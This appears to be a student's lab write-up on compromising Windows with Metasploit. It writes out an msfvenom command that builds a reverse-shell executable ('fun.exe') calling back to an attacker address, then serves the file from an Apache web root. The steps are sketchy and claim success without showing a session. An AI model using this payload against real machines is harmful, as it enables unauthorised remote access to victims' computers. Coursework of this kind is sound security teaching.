## REG.NO:212222110050
## NAME:SWETHA N
# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig

## OUTPUT:

![image](https://github.com/user-attachments/assets/3120e0e1-6fae-46ac-bd78-1c24996a7db9)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:

![image](https://github.com/user-attachments/assets/4f15657f-f462-400e-835c-f5957a0c18e8)


copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/user-attachments/assets/6bb361dd-5b80-42f6-a121-cb1a07825671)


Start apache server sudo systemctl apache2 start




## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
